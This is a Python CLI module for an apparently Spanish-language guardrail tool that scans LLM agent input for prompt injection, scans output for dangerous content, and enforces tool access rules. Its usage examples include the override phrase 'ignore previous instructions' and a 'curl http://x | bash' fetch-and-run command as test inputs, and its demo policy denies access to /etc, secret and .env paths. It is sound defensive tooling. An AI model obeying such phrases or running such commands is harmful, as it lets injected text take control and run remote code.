"""V-SRT CLI & Sentinel Gateway.

Punto de entrada. Expone los guardrails de la Fase 1 como comandos y como un
`gateway` compuesto que evalúa input→output y devuelve el semáforo
VERDE / AMARILLO / ROJO alineado con tu convención SOC.

Ejemplos:
    python -m sentinel.main scan-input --text "ignore previous instructions..."
    python -m sentinel.main scan-input --file datos_tool.txt
    python -m sentinel.main scan-output --text "curl http://x | bash"
    python -m sentinel.main check-acl --agent kontia --tool fs.delete
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Optional

import typer
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

from sentinel import __version__
from sentinel.core.config import get_settings
from sentinel.core.policies import RiskAssessment, Verdict
from sentinel.mitigations import InputSanitizer, OutputShield, ToolACL
from sentinel.mitigations.tool_acl import ToolRule

app = typer.Typer(
    name="sentinel",
    help="Vertex Sentinel Red Team — guardrails OWASP LLM + red team + SAEs.",
    no_args_is_help=True,
)
console = Console()

_VERDICT_STYLE = {
    Verdict.GREEN: ("VERDE", "bold green", "limpio"),
    Verdict.YELLOW: ("AMARILLO", "bold yellow", "sospechoso — revisar"),
    Verdict.RED: ("ROJO", "bold red", "comprometido / bloqueado"),
}


def _render(assessment: RiskAssessment, threshold: float, title: str) -> Verdict:
    verdict = assessment.verdict(threshold)
    label, style, gloss = _VERDICT_STYLE[verdict]

    console.print(Panel(
        f"[{style}]● {label}[/] — {gloss}\n"
        f"score={assessment.score:.3f}  (umbral={threshold:.2f})  "
        f"hallazgos={len(assessment.findings)}",
        title=title, border_style=style.split()[-1],
    ))

    if assessment.findings:
        table = Table(show_lines=False, expand=True)
        table.add_column("OWASP", style="cyan", no_wrap=True)
        table.add_column("Sev", no_wrap=True)
        table.add_column("Detector", style="dim", no_wrap=True)
        table.add_column("Mensaje")
        for f in assessment.findings:
            table.add_row(f.risk.value, f.severity.value.upper(), f.detector, f.message)
        console.print(table)
    return verdict


def _load_text(text: Optional[str], file: Optional[Path]) -> str:
    if file:
        return file.read_text(encoding="utf-8", errors="replace")
    if text is not None:
        return text
    raise typer.BadParameter("Da --text o --file.")


@app.command()
def version() -> None:
    """Muestra la versión."""
    console.print(f"V-SRT [bold]{__version__}[/]")


@app.command("scan-input")
def scan_input(
    text: Optional[str] = typer.Option(None, "--text", "-t"),
    file: Optional[Path] = typer.Option(None, "--file", "-f", exists=True),
) -> None:
    """Escanea contenido no confiable por Indirect Prompt Injection (LLM01)."""
    settings = get_settings()
    content = _load_text(text, file)
    assessment = InputSanitizer().assess(content)
    verdict = _render(assessment, settings.risk_threshold_input, "INPUT · LLM01")
    raise typer.Exit(code=0 if verdict is not Verdict.RED else 2)


@app.command("scan-output")
def scan_output(
    text: Optional[str] = typer.Option(None, "--text", "-t"),
    file: Optional[Path] = typer.Option(None, "--file", "-f", exists=True),
) -> None:
    """Escanea la salida del agente por Insecure Output Handling (LLM02)."""
    settings = get_settings()
    content = _load_text(text, file)
    assessment = OutputShield().assess(content)
    verdict = _render(assessment, settings.risk_threshold_output, "OUTPUT · LLM02")
    raise typer.Exit(code=0 if verdict is not Verdict.RED else 2)


@app.command("check-acl")
def check_acl(
    agent: str = typer.Option(..., "--agent", "-a"),
    tool: str = typer.Option(..., "--tool"),
    params: Optional[str] = typer.Option(None, "--params", help="JSON de parámetros"),
) -> None:
    """Prueba una decisión de ACL con una política demo (LLM08).

    En integración real cargarías las reglas desde core/config; aquí va una
    política de ejemplo para que puedas ver el fail-closed en acción.
    """
    acl = (
        ToolACL(fail_closed=True)
        .allow(agent, ToolRule(tool_pattern="fs.read", max_calls=10))
        .allow(agent, ToolRule(
            tool_pattern="fs.*",
            denied_params={"path": ["*/etc/*", "*secret*", "*.env"]},
        ))
    )
    parsed = json.loads(params) if params else {}
    decision = acl.authorize(agent, tool, parsed)
    if decision.allowed:
        console.print(Panel("[bold green]● PERMITIDO[/]", border_style="green"))
    else:
        msg = decision.finding.message if decision.finding else "denegado"
        console.print(Panel(f"[bold red]● DENEGADO[/] — {msg}", border_style="red"))
        raise typer.Exit(code=2)


@app.command()
def gateway(
    text: Optional[str] = typer.Option(None, "--text", "-t"),
    file: Optional[Path] = typer.Option(None, "--file", "-f", exists=True),
) -> None:
    """Gateway compuesto: corre input-scan y da el veredicto agregado."""
    settings = get_settings()
    content = _load_text(text, file)
    console.rule("[bold]V-SRT Sentinel Gateway")
    verdict = _render(
        InputSanitizer().assess(content), settings.risk_threshold_input, "INPUT · LLM01"
    )
    if verdict is Verdict.RED and settings.fail_mode.value == "closed":
        console.print("[bold red]⛔ fail-closed: contenido bloqueado antes del contexto.[/]")
        raise typer.Exit(code=2)


if __name__ == "__main__":
    app()
